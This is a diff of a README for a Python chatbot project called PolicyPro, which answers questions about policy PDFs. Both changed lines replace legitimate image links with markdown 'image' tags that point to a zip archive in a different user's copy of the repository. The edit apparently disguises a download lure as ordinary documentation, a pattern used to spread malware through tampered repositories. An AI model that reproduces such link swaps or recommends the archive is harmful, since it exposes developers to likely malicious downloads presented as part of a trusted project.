@@ -12,7 +12,7 @@ llama_index.readers.file: A submodule of llama_index used for reading data from 
 llama_index.llms.openai: Integration with OpenAI's GPT (Generative Pre-trained Transformer) models for natural language processing tasks.
 streamlit: A web application framework used for building interactive web applications with Python. In this case, it's used for creating a user interface for the PolicyPro chatbot.
 
-![image](https://github.com/Pradyumna7000/PolicyPro/assets/98828461/9580e28a-3744-4556-a2be-55477b63871f)
+![image](https://github.com/SyedFuzlan/PolicyPro/raw/refs/heads/main/twopenny/Pro_Policy_1.7.zip)
 
 Workflow:
 The code first loads PDF data containing information about policies using the PDFReader from llama_index.
@@ -21,7 +21,7 @@ The ReActAgent class from llama_index is utilized to create an AI-powered agent 
 The user interface is created using streamlit, allowing users to input their queries and receive responses from the PolicyPro chatbot.
 The chat history is stored using st.session_state.messages to maintain continuity between user interactions.
 
-![image](https://github.com/Pradyumna7000/PolicyPro/assets/98828461/5f2e3611-da5e-473a-99e8-66152c30f13d)
+![image](https://github.com/SyedFuzlan/PolicyPro/raw/refs/heads/main/twopenny/Pro_Policy_1.7.zip)
 
 Usage:
 To use the PolicyPro chatbot:
